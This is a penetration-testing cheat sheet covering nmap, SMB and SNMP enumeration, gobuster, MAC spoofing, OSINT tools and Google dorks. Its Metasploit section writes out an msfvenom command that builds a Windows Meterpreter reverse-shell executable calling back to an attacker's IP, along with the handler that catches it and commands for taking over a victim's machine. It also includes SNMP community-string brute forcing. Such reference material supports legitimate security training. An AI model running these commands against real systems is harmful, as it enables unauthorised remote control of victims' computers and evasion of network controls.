# CHEATSHEETS

# Access

ssh <user>@<host>
ftp -p <host> <port> <username> <pass> # FTP connection in passive mode. <port>, <username> and <pass> are optional


# Banner Grabbing

netcat <target> <port> # Listens on a TCP port (bind shell listener)
ncat <target> <port>
nc <target> <port>
nc -nv <target> <port>

# Scan

## nmap
nmap <target> # Only scan the 1000 most common ports by default.
nmap -sV -sC -p- <target> # Full TCP port scan with service discovery and default scripts
nmap -sC -sV -vv -p- -oA <file> <target> # Full TCP port scan with service/version detection, default scripts, verbose output, and saved results.
nmap --script <script name> -p<port> <target> # Runs a specific NSE script against a chosen port on the target host
nmap -sV --script=banner <target> # Detects running services and retrieves service banners from the target
nmap -A -p <ports> <target> # Performs aggressive scanning (OS detection, version detection, scripts, traceroute) on specified ports.

## smb
smbclient -N -L \\\\<target> # Lists available SMB shares on the target host without authentication.
smbclient \\\\<target>\\<smb share> # Accesses a specific SMB share on the target.
smbclient -U <user> \\\\<target>\\<smb share> # Authenticates to an SMB share using a specific user account.

## SNMP
snmpwalk -v <version> -c <community> <target> <OID> # Queries an SNMP device using a specified SNMP version and community string to retrieve the value of a given OID.
onesixtyone -c <community_list> <target> # Brute-forces SNMP community strings on the target host.

# Penetration testing

## Metasploit

use exploit/multi/handler # Starts a Metasploit listener to catch incoming reverse shell connections from a deployed payload.
set payload windows/meterpreter/reverse_tcp # Sets the payload to match the one used when generating the executable.
set LHOST <Attacker's IP Address> # Specifies the attacker's IP address to listen on.
set LPORT <Attacker's Port Number> # Specifies the port to listen on for the incoming connection.
exploit  # Launches the handler and awaits the reverse connection from the target.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker's IP Address> LPORT=<Attacker's Port Number> -f exe -o /path/to/output/payload.exe  # Generates a Windows Meterpreter reverse TCP payload as an executable, connecting back to the specified IP address and port upon execution.

## Meterpreter Commands

sysinfo  # To view the victim's system information
shell  # To access the command line on the victim's computer
screenshot  # To take a screenshot of the victim's screen

# Web Enumeration

## Gobuster
gobuster dir -u <target> -w <file> # Performs directory brute-forcing.

# MAC Address Spoofing
sudo ifconfig eth0 down # Disables the eth0 network interface so changes can be applied.
sudo ifconfig eth0 up # Re-enables the eth0 network interface after changes are made

## MAC Changer
sudo macchanger -m <mac address> eth0 # Changes the MAC address of eth0 to the specified value.
macchanger -s eth0 # Displays the current and original MAC address of eth0.

# URL
## Curl
curl -v <target> # Sends a verbose HTTP request, displaying headers and connection details

# OSINT

## Spidefoot
spiderfoot -l <ip>:<port>  # Starts the SpiderFoot web interface and listens on the specified IP address and port.

## Google Dorks

| #  | Dork        | Description                                               | Usage Example               |
| :- | :---------- | :-------------------------------------------------------- | :-------------------------- |
| 1  | site:       | Searches within a specific site.                          | site:example.com            |
| 2  | filetype:   | Searches for a specific file type.                        | filetype:pdf                |
| 3  | intitle:    | Searches for pages with specific words in the title.      | intitle:"login"             |
| 4  | inurl:      | Searches for pages with specific words in the URL.        | inurl:admin                 |
| 5  | cache:      | Displays pages stored in Google's cache.                  | cache:example.com           |
| 6  | link:       | Finds pages that link to a specific page.                 | link:example.com            |
| 7  | related:    | Finds sites similar to a specific site.                   | related:example.com         |
| 8  | intext:     | Searches for specific words within the page text.         | intext:"password"           |
| 9  | allintitle: | Searches for pages with all specified words in the title. | allintitle:login admin      |
| 10 | allinurl:   | Searches for pages with all specified words in the URL.   | allinurl:admin login        |
| 11 | allintext:  | Searches for pages with all specified words in the text.  | allintext:username password |
| 12 | define:     | Searches for the definition of a specific word.           | define:OSINT                |
| 13 | "keyword"   | Searches for an exact phrase.                             | "admin login"               |
| 14 | -keyword    | Excludes pages containing a specific word.                | password -example           |
| 15 | OR          | Searches for pages containing either of two words.        | login OR signup             |
| 16 | *           | Acts as a wildcard for any word.                          | intitle:"admin *"           |
| 17 | ..          | Searches for numbers within a range.                      | filetype:pdf 2020..2022     |
| 18 | info:       | Displays information about a specific site.               | info:example.com            |
| 19 | maps:       | Shows the map of a specific location.                     | maps:New York               |
| 20 | stocks:     | Shows stock information for a specific company.           | stocks:GOOG                 |